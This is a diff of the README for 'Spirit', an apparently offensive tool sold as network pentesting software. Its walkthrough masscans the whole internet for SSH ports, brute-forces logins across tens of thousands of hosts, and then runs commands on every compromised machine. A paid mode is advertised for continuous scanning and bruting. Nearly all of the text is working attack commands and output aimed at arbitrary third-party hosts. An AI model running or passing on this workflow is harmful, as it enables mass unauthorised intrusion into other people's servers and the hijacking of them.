@@ -1,10 +1,12 @@
-# Spirit - Pentest Tools
+# Spirit - Network Pentesting Tools
 
-Check out the helpfile [`$ ./spirit --help`](./HELP) to see the whole toolset.
+## [Download the latest Spirit release](https://github.com/theaog/spirit/releases)
+
+> Check out the helpfile [`$ ./spirit --help`](./HELP) to see the whole set of tools.
 
 ## Example usage for SSH brute
 ```bash
-# make sure your masscan command uses -oG open.lst for the results output file
+# First scan your network or the internet to acquire a list of open ports.
 $ masscan \
     --rate="50000" \
     --ports "22,222,2222,2212" 0.0.0.0/0 \
@@ -12,32 +14,37 @@ $ masscan \
     -oG open.lst
 Scanning 4294967295 hosts [4 ports/host]
 
+# Parse the masscan output so that it's usable w/ spirit.
 $ ./spirit parse open.lst
 INFO created h.lst in HOST:PORT format
 
+# Now test these open ports if they're running SSH by grabbing banners.
 $ ./spirit banner
 SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
 INFO created b.lst in HOST:PORT:BANNER format
 
+# Move the banner output for spirit to load (default h.lst).
 $ mv b.lst h.lst
 
-# add passwords list
+# Add a password list for spirit to load (default p.lst).
 $ cat > p.lst << EOF
 user1:pass1
 user1:pass2
 user2:pass50
 EOF
 
+# Start bruting...
 $ ./spirit brute
 INFO loaded h.lst with 26803 hosts
 INFO loaded p.lst with 4881 logins
 [2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
 $ less -S found.lst
+
+# Connect to all your vulnerable hosts automatically & run commands.
+$ ./spirit omni -c 'whoami && uptime'
 ```
 
-> Tip: you can automate these steps with `./spirit auto` or use the [`./go.sh`](./go.sh) script.
-
-## [Download the latest Spirit release](https://github.com/theaog/spirit/releases)
+> Tip: you can automate these steps with `./spirit auto` or use the [`./go.sh`](./go.sh) script or if you have Pro license `./spirit forever` for continuous automatic scanning & bruting.
 
 ## Upgrade Spirit automaticaly
 ```bash
